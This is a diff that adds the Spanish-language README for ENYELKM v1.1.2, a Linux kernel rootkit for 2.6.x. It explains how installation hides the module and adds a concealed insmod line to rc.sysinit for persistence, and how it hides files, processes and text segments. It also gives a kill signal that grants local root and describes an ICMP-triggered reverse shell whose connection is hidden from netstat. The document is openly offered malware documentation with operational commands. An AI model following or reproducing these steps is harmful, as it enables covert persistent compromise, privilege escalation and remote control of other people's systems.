@@ -1,0 +1,138 @@
+/*
+ * ENYELKM v1.1.2
+ * Linux Rootkit x86 kernel v2.6.x
+ *
+ * By RaiSe & David Reguera García
+ * < raise@enye-sec.org 
+ * http://www.enye-sec.org >
+ *
+ * davidregar@yahoo.es - http://www.fr33project.org
+ */
+
+
+ Testeado en kernels:  + v2.6.3  + v2.6.14.3  + v2.6.11-1.1369_FC4
+
+
+ Para compilar:
+
+   # make
+
+ Para instalar:
+
+   # make install
+
+ Para compilar solo 'conectar':
+
+   # make conectar
+
+
+ * Lo que hace make install:
+ 
+ - Copia el fichero enyelkm.ko a /etc/.enyelkmOCULTAR.ko, de forma
+ que una vez cargado el modulo el fichero permanecera oculto.
+
+ - Añade la cadena insmod /etc/.enyelkmOCULTAR.ko entre las marcas
+ #<OCULTAR_8762> y #</OCULTAR_8762> al fichero /etc/rc.d/rc.sysinit,
+ de forma que una vez cargado el modulo esas lineas permaneceran
+ ocultas.
+ 
+ - Carga el modulo mediante insmod /etc/.enyelkmOCULTAR.ko.
+
+ - Intenta sobreescribir la fecha de archivo modificado de 
+ /etc/rc.d/rc.sysinit con la de /etc/rc.d/rc, y ponerle el
+ atributo +i a /etc/.enyelkmOCULTAR.ko con touch y chattr
+ respectivamente.
+
+
+ * Ocultar ficheros, directorios y procesos:
+
+ Se ocultan los ficheros, directorios y procesos que contengan
+ la subcadena 'OCULTAR' en su nombre. En el caso de los procesos
+ tambien se ocultan los que tengan gid = 0x489196ab. La shell
+ remota (ver acceso remoto mas abajo) corre con ese gid, por lo
+ que la shell y todos los procesos que se lancen desde ella
+ permaneceran ocultos.
+
+
+ * Ocultar partes de un fichero:
+
+ Se oculta en un fichero todo lo que este entre las marcas:
+ (marcas incluidas)
+
+ #<OCULTAR_8762>
+ texto a ocultar
+ #</OCULTAR_8762>
+
+
+ * Consiguiendo root local:
+
+ Haciendo: # kill -s 58 12345
+ se consigue id 0.
+
+
+ * Ocultacion del modulo a 'lsmod':
+
+ El modulo se auto_oculta al cargarlo.
+
+
+ * Ocultacion del modulo a '/sys/module':
+
+ Para que no aparezca el modulo en ese directorio basta con renombrar
+ el LKM para que lleve la cadena OCULTAR en su nombre antes de cargarlo;
+ como hace 'make install' por ejemplo.
+
+
+ * Acceso remoto:
+
+ Usar el programa 'conectar', que va incluido en el tgz. Se compila con
+ el make del LKM. Ejecutar de la forma: './conectar ip_maquina_con_lkm'.
+ El programa enviara un ICMP especial, y abrira un puerto a la escucha
+ en la que recibira la reverse shell. Para salir de la shell: control+c.
+
+
+ * Ocultacion de la conexion de la reverse shell al netstat:
+
+ Se auto_ocultan todas las conexiones a la ip que envio el ICMP con el
+ programa conectar.
+
+
+ * Desinstalacion del modulo:
+
+ El modulo no puede descargarse mediante 'rmmod' ya que permanece
+ oculto. Y aunque estuviera visible no se podria ya que el sistema
+ dejaria de funcionar. La unica forma es reiniciando el sistema. En caso
+ de haber hecho 'make install', una forma de quitar la cadena oculta
+ de /etc/rc.d/rc.sysinit es editando ese fichero y guardandolo sin
+ modificar nada, de esa forma se guardara sin la cadena ya que el
+ editor no la 've'. Luego reiniciar. Una forma sencilla de mirar si 
+ el LKM esta cargado es haciendo un 'kill -s 58 12345' y mirando si
+ da root.
+
+
+ [ -- ]
+
+
+ --> En la version 1.2:
+
+ Para la version 1.2 voy a ver si mejoro el sistema de ocultar la conexion
+ cuando se usa el acceso remoto. Ahora mismo lo hace a traves de sys_read y 
+ el fichero /proc/net/tcp. Como netstat hace 'reads' de 300 en 300 bytes, hay
+ una pequeña posibilidad de que si en medio de un read y el siguiente esta el
+ socket con nuestra conexion oculta, el netstat muestre una linea que ponga:
+ 'bogus line'. Nuestra ip nunca se mostrara, y aunque normalmente nunca vaya
+ a ocurrir eso, a ver si para la v1.2 se ocultan las conexiones de otra forma.
+
+ De paso tambien a ver si evito usar /proc/kallsyms para conseguir do_fork y
+ sysenter_entry.
+
+ Tambien intentare adaptarlo para que compile y funcione en kernels 2.4.x.
+
+
+ -> Agradecimientos:
+
+ Gracias a kenshin por darme algunas ideas, y ayudarme a mejorarlo y a
+ testearlo ;).
+
+
+
+EOF
